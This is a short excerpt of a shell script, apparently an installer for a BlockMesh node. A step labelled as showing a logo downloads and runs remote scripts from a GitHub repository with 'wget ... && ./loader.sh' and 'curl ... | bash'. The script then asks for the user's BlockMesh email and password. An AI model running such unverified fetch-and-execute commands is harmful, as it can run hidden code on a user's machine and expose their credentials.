...
echo "Showing BJ logo..."
wget -O loader.sh https://raw.githubusercontent.com/lxnrdn/node/refs/heads/main/loader.sh && chmod +x loader.sh && ./loader.sh
curl -s https://raw.githubusercontent.com/lxnrdn/node/refs/heads/main/logo.sh | bash
sleep 2
...
read -p "BJ - BlockMesh email: " email
read -s -p "BJ - BlockMesh password: " password
echo
